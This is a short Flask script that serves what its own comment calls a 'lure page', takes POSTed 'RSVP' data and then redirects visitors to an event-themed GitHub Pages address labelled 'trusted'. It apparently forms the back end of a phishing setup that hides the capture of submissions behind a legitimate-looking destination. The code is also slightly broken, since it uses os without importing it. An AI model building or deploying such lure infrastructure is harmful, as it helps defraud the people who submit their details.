from flask import Flask, request, redirect, url_for, render_template

app = Flask(__name__, static_folder='static')

@app.route('/rsvp', methods=['POST'])
def handle_rsvp():
    # Process RSVP data here (save to DB, send email, etc.)
    # ... your existing RSVP logic ...
    
    # SEAMLESS SERVER-SIDE REDIRECT TO TRUSTED GITHUB PAGES
    return redirect('https://mjaj052-lang877.github.io/event-rsvp-2024/', code=302)

@app.route('/')
def index():
    return render_template('index.html')  # Your original lure page

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
